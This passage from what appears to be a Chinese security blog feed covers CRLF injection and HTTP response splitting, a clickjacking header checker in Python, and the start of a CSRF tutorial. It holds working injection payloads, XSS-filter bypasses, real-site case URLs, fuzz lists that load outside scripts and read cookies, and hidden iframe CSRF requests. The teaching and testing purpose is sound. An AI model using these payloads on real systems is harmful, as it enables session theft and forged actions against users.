<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">200</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aHTTP/<span class="number">1.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text/html%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">2047</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p> <code>Content-Length：0</code> 代表header 的结尾，返回包会变成这个样子 </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Encoding: deflate</span><br><span class="line">xxxxxxxx</span><br><span class="line">Locations=https:<span class="comment">//baidu.com</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>触发漏洞</p>
<h3 id="CRLF绕过浏览器xss-filte"><a href="#CRLF绕过浏览器xss-filte" class="headerlink" title="CRLF绕过浏览器xss-filte"></a>CRLF绕过浏览器xss-filte</h3><p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。 关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
<p>所以在绕过时只需要将 X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
<h3 id="CRLF挖掘"><a href="#CRLF挖掘" class="headerlink" title="CRLF挖掘"></a>CRLF挖掘</h3><p>通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。 注意输入点和输出点， 提交%0D%0A字符，验证服务器是否响应%0D%0A，若过滤可以通过双重编码绕过 ， 漏洞利用，使杀伤最大化，将漏洞转化为HTML注入，XSS等。 </p>
<h3 id="CRLF案例"><a href="#CRLF案例" class="headerlink" title="CRLF案例"></a>CRLF案例</h3><h4 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h4><p>实际中没有碰见过，这里贴P牛以前的实例</p>
<p>新浪某分站含有一个url跳转漏洞+CRLF</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//xxx.sina.com.cn/?url=%0a%0d%0a%0d%3Cimg%20src=1%3E</span></span><br></pre></td></tr></table></figure>
<p>加入 CRLF Injection 时注入成功， 图片已经输出在页面中</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270515.32.png" alt></p>
<p>测试XSS</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270559.83.png" alt></p>
<p>查看控制台，被XSS Filter拦截，此时注入<code>X-XSS-Protection:0</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270619.59.png" alt></p>
<p>用字符编码来绕过XSS Filter，当编码是is-2022-kr时浏览器会忽略%0f，这样我们在onerror后面加个%0f就能绕过filter，前提是注入一个 <code>&lt;meta charset=ISO-2022-KR&gt;</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1573270680.5.png" alt></p>
<h4 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">GET /charts/total-bitcoins?cors=<span class="literal">true</span>&amp;format=csv&amp;lang=english HTTP/<span class="number">1.1</span></span><br><span class="line">Host: api.blockchain.info</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.12</span>; rv:<span class="number">55.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">HTTP/2.0 200 OK</span></span><br><span class="line"><span class="comment">date: Tue, 31 Oct 2017 15:47:21 GMT</span></span><br><span class="line"><span class="comment">content-type: text/csv; charset=ascii</span></span><br><span class="line"><span class="comment">content-length: 10953</span></span><br><span class="line"><span class="comment">access-control-allow-origin: *</span></span><br><span class="line"><span class="comment">cache-control: public, max-age=60</span></span><br><span class="line"><span class="comment">content-disposition: attachment; filename="total-bitcoins.csv"</span></span><br><span class="line"><span class="comment">content-language: english</span></span><br><span class="line"><span class="comment">"lang"参数出现在了返回包里</span></span><br><span class="line"><span class="comment">现在为了注入CRLF 我们需要url编码一下\r\n "%0D%0A"</span></span><br><span class="line"><span class="comment">据此发送如下请求</span></span><br><span class="line"><span class="comment">https://api2.blockchain.info/charts/total-bitcoins?cors=true&amp;format=csv&amp;lang=en%0ATEST</span></span><br><span class="line"><span class="comment">新的header出现在了返回包里</span></span><br><span class="line"><span class="comment">这里存在CRLF注入漏洞 ，这样可以进行利用CRLF漏洞去执行JavaScript代码，去盗取cookie</span></span><br><span class="line"><span class="comment">最终的Payload</span></span><br><span class="line"><span class="comment">https://api2.blockchain.info/charts/total-bitcoins?cors=true&amp;format=csv&amp;lang=en%0AX-XSS-Protection:0%0AContent-Type:text/html%0AContent-Length:35%0A%0A%3Csvg%20onload%3Dalert%28document.domain%29%3E&amp;__cf_waf_tk__=012853002E6loVIOSyqHfdxrvHJ87MshEnZI</span></span><br></pre></td></tr></table></figure>
<h3 id="CRLF修复"><a href="#CRLF修复" class="headerlink" title="CRLF修复"></a>CRLF修复</h3><p>修复HRS漏洞，过滤\r 、\n之类的换行符，避免输入的数据污染到其他HTTP头。</p>
<h3 id="CRLF-PAYLOAD"><a href="#CRLF-PAYLOAD" class="headerlink" title="CRLF-PAYLOAD"></a>CRLF-PAYLOAD</h3><h4 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>aheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">23</span>%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">%<span class="number">3</span>f%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">250</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">250</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%%<span class="number">0</span>a0aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">3</span>f%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">23</span>%<span class="number">0</span>dheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">25</span>%<span class="number">30</span>aheader:header</span><br><span class="line"></span><br><span class="line">/%<span class="number">25</span>%<span class="number">30</span>%<span class="number">61</span>header:header</span><br><span class="line"></span><br><span class="line">/%u000aheader:header</span><br></pre></td></tr></table></figure>
<h4 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a><strong>开放重定向</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/www.google.com/%<span class="number">2</span>f%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">0</span>d%<span class="number">0</span>aheader:header</span><br></pre></td></tr></table></figure>
<h4 id="CRLF-XSS"><a href="#CRLF-XSS" class="headerlink" title="CRLF-XSS"></a><strong>CRLF-XSS</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">35</span>%<span class="number">0</span>d%<span class="number">0</span>aX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a23%<span class="number">0</span>d%<span class="number">0</span>a&lt;svg%<span class="number">20</span>onload=alert(<span class="built_in">document</span>.domain)&gt;%<span class="number">0</span>d%<span class="number">0</span>a0%<span class="number">0</span>d%<span class="number">0</span>a/%<span class="number">2</span>e%<span class="number">2</span>e</span><br></pre></td></tr></table></figure>
<h4 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a><strong>XSS绕过</strong></h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">2</span>Fxxx:<span class="number">1</span>%<span class="number">2</span>F%<span class="number">0</span>aX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>aContent-Type:text/html%<span class="number">0</span>aContent-Length:<span class="number">39</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">3</span>cscript%<span class="number">3</span>ealert(<span class="built_in">document</span>.cookie)%<span class="number">3</span>c/</span><br></pre></td></tr></table></figure>
<p><strong>Location</strong> </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text%<span class="number">2</span>fhtml%<span class="number">0</span>d%<span class="number">0</span>aHTTP%<span class="number">2</span>f1<span class="number">.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContent-Type:%<span class="number">20</span>text%<span class="number">2</span>fhtml%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(<span class="string">'XSS'</span>);%<span class="number">3</span>C%<span class="number">2</span>fscript%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<h4 id="其它一些FUZZ的payload"><a href="#其它一些FUZZ的payload" class="headerlink" title="其它一些FUZZ的payload"></a>其它一些FUZZ的payload</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br><span class="line">r%<span class="number">0</span>d%<span class="number">0</span>aContentLength:%<span class="number">200</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aHTTP/<span class="number">1.1</span>%<span class="number">20200</span>%<span class="number">20</span>OK%<span class="number">0</span>d%<span class="number">0</span>aContentType:%<span class="number">20</span>text/html%<span class="number">0</span>d%<span class="number">0</span>aContentLength:%<span class="number">2019</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a&lt;html&gt;Injected%<span class="number">02</span>Content&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">%0d%0d%0a%0a</span></span><br><span class="line"><span class="regexp">0x0D0x0A</span></span><br><span class="line"><span class="regexp">0x0D0x0D0x0A0x0A</span></span><br><span class="line"><span class="regexp">\r\n</span></span><br><span class="line"><span class="regexp">%5cr%5cn</span></span><br><span class="line"><span class="regexp">%0%0d%0ad%0%0d%0aa</span></span><br><span class="line"><span class="regexp">%0%0D%0AD%0%0D%0AA</span></span><br><span class="line"><span class="regexp">%0d%0aContentType:%20text/</span>html;charset=UTF<span class="number">-7</span>%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:%<span class="number">20129</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">2</span>BADw-html%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-body%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-script%<span class="number">2</span>BAD4-alert%<span class="number">28</span>%<span class="number">27</span>XSS,<span class="attr">cookies</span>:%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">2</span>BADw-<span class="regexp">/script%2BAD4-%2BADw-/</span>body%<span class="number">2</span>BAD4-%<span class="number">2</span>BADw-<span class="regexp">/html%2BAD4</span></span><br><span class="line"><span class="regexp">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/</span>script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>AContent-Type:html%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>Ehttp:<span class="comment">//www.test.com</span></span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Chtml%<span class="number">3</span>E%<span class="number">3</span>Cbody%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fbody%<span class="number">3</span>E%<span class="number">3</span>Cscript+src%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fha.ckers.org%<span class="number">2</span>Fs.js%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>location.host%<span class="number">20</span>is:%<span class="number">20</span>%<span class="number">22</span>%<span class="number">2</span>Blocation.host)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fhtml%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript+src%<span class="number">3</span>Dhttp%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fha.ckers.org%<span class="number">2</span>Fxss.js%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span><br><span class="line">%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">22</span></span><br><span class="line">%<span class="number">0</span>AContent-type:%<span class="number">20</span>text/html%<span class="number">0</span>A%<span class="number">0</span>Ahttp:<span class="comment">//www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span></span><br><span class="line">%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span><br><span class="line">%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert(%<span class="number">22</span>XSS%<span class="number">22</span>)%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.anquan.us/static/drops/papers-2466.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-2466.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1516335" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516335</a> </p>
<p><a href="https://c1h2e1.github.io/#" target="_blank" rel="noopener">https://c1h2e1.github.io/#</a> </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CRLF</tag>
        <tag>HTTP相应拆分漏洞</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ系列漏洞复现总结</title>
    <url>/2019/11/09/ActiveMQ%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="您好, 这里需要密码." />
    <label for="pass">您好, 这里需要密码.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">

</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>clickjack</title>
    <url>/2019/10/28/clickjack/</url>
    <content><![CDATA[<h3 id="clickjack-check"><a href="#clickjack-check" class="headerlink" title="clickjack_check"></a>clickjack_check</h3><blockquote>
<p>巩固写代码，顺便使用loguru记录日志emmm；此处本质上就是检测返回数据包中是否存在X-FRAME-OPTIONS</p>
</blockquote>
<p>废话不说，直接上代码</p>
<h4 id="非面向对象"><a href="#非面向对象" class="headerlink" title="非面向对象"></a>非面向对象</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_check</span><span class="params">(url)</span>:</span></span><br><span class="line">    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">    log_file_path = os.path.join(base_dir,<span class="string">'/Log/click_test.log'</span>)</span><br><span class="line">    <span class="comment"># print(base_dir)</span></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>&#125;</span><br><span class="line">    respone = requests.get(url=url,headers=headers,timeout=<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> respone.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">'[+]Target stability'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            hea = respone.headers</span><br><span class="line">            req1 = <span class="string">'[-]X-FRAME-OPTIONS '</span> + hea[<span class="string">'X-FRAME-OPTIONS'</span>]</span><br><span class="line">            req2 = <span class="string">'[-]X-FRAME-OPTIONS header, no click hijacking vulnerability can be used'</span></span><br><span class="line">            logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            req1 = <span class="string">'[+]There is no X-FRAME-OPTIONS header. There is a clicking hijacking vulnerability'</span></span><br><span class="line">            req2 = <span class="string">'[!]Remind:It may be a defense against JS. Please test it yourself'</span></span><br><span class="line">            logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[-]bjective instability'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'Poc for clickjack.'</span>)</span><br><span class="line">    parse.usage = <span class="string">"python3 clickjack.py [-h] [-u URL] "</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The website to be tested Url'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        url = args.url</span><br><span class="line">        click_check(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parse.print_help()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:      </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">click_jack</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self)</span>:</span></span><br><span class="line">        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">        log_file_path = os.path.join(base_dir,<span class="string">'/Log/click_test.log'</span>)</span><br><span class="line">        <span class="comment"># print(base_dir)</span></span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>&#125;</span><br><span class="line">        respone = requests.get(url=self._url,headers=headers,timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">if</span> respone.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">'[+]Target stability'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                hea = respone.headers</span><br><span class="line">                req1 = <span class="string">'[-]X-FRAME-OPTIONS '</span> + hea[<span class="string">'X-FRAME-OPTIONS'</span>]</span><br><span class="line">                req2 = <span class="string">'[-]X-FRAME-OPTIONS header, no click hijacking vulnerability can be used'</span></span><br><span class="line">                logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">                logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                req1 = <span class="string">'[+]There is no X-FRAME-OPTIONS header. There is a clicking hijacking vulnerability'</span></span><br><span class="line">                req2 = <span class="string">'[!]Remind:It may be a defense against JS. Please test it yourself'</span></span><br><span class="line">                logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">                logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-]bjective instability'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        parse = argparse.ArgumentParser(description=<span class="string">'Poc for clickjack.'</span>)</span><br><span class="line">        parse.usage = <span class="string">"python3 clickjack.py [-h] [-u URL] "</span></span><br><span class="line">        parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The website to be tested Url'</span>)</span><br><span class="line">        args = parse.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            url = args.url</span><br><span class="line">            self._url = url</span><br><span class="line">            self.check()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parse.print_help()</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    click = click_jack(<span class="string">''</span>)</span><br><span class="line">    click.main()</span><br></pre></td></tr></table></figure>
<p>效果如图：包含日志信息（日志信息如果想只存储结果，格式化时只保留message即可）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572235466.73.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572235483.72.png" alt></p>
<p>关于loguru可以看之前的文章</p>
<p><a href="http://www.lsowl.top/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/" target="_blank" rel="noopener">Python 中更优雅的日志记录方案</a></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a> </p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>界面劫持</tag>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF总结</title>
    <url>/2019/10/27/CSRF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><blockquote>
<p>cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会话的客户端的信任进行的攻击 。csrf又称为xsrf，它与xss最大的区别就在于，csrf并没有盗取cookie而是直接利用。</p>
</blockquote>
<h3 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h3><p>利用目标用户的合法身份，以用户的名义进行非法的操作</p>
<h3 id="CSRF的分类"><a href="#CSRF的分类" class="headerlink" title="CSRF的分类"></a>CSRF的分类</h3><h4 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4><p>GET型CSRF漏洞，只需要构造URL，然后诱导受害者访问利用。    HTML中可以设置src/href等地址的标签都可以发起一个GET请求：</p>
<p>利用a标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用img标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用iframe:注意：可以设置iframe的style为display:none，以此来不显示iframe加载的内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>CSS中background利用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"background: url('http://www.xxx.com/new_user.php?username=123&amp;password=123456');"</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还有</p>
